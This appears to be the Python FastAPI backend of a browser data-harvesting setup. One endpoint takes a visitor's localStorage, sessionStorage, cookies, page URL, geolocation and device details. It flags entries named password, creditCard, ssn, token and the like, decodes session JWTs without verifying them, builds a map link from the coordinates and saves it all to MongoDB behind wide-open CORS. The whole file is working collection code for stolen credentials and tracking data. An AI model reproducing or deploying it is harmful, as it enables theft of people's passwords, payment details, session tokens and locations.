from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Dict, Any
import jwt
from dotenv import load_dotenv
import os
from pymongo import MongoClient

load_dotenv()

MONGODB_URI = os.getenv("MONGODB_URI")

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

class KeyValue(BaseModel):
    key: str
    value: Any

class Payload(BaseModel):
    localStorageData: List[KeyValue]
    sessionStorageData: List[KeyValue]
    cookies: List[KeyValue]
    currentUrl: str
    geolocationData: Any
    deviceData: Any



SENSITIVE_KEYS = {
    "password",
    "creditCard",
    "ssn",
    "token",
    "authToken",
    "refreshToken",
    "userData",
    "personalInfo",
    "email",
    "phoneNumber"
}

def decode_jwt(token: str) -> Dict[str, Any]:
    try:
        decoded = jwt.decode(token, options={"verify_signature": False}) 
        return decoded
    except jwt.DecodeError:
        return {}

client = MongoClient(MONGODB_URI)
db = client["collectionData"]
response_data_collection = db["collectionLocation"]

@app.post("/")
async def root(payload: Payload):
    sensitive_data = []
    non_sensitive_data = []
    location = payload.geolocationData
    # print(payload.deviceData, ">")
    deviceData ={}
    deviceData= payload.deviceData
    
    for item in payload.localStorageData + payload.sessionStorageData + payload.cookies:
        if item.key in SENSITIVE_KEYS:
            sensitive_data.append(dict(item))
        else:
            non_sensitive_data.append(dict(item))

    token = None
    for item in sensitive_data:
        if item["key"] == "token":  
            token = item["value"]    
            break
    
    decoded_token = {}
    if token:
        decoded_token = decode_jwt(token)    
    
    google_maps_url = None
    if location:
        google_maps_url = f"https://www.google.com/maps/search/?api=1&query={location['latitude']},{location['longitude']}"   
    
    response_data = {
        "message": "hello" + decoded_token.get('name', ''),
        "sensitive_data": sensitive_data,
        "non_sensitive_data": non_sensitive_data,
        "decoded_token": decoded_token,
        "geolocationData": google_maps_url,
        "deviceData": payload.deviceData
    }
    
    # Check if data already exists
    existing_data = response_data_collection.find_one({})  # Empty filter to find any existing data
    
    if existing_data:
        # If data exists, compare and update if necessary
        if existing_data != response_data:  
            response_data_collection.update_one({}, {"$set": response_data})  # Update existing data
            return {"status": "Data updated in MongoDB collection"}
        else:
            return {"status": "Data is identical, ignoring"}
    else:
        # If no data exists, insert new data
        response_data_collection.insert_one(response_data)
        return {"status": "Data stored in MongoDB collection"}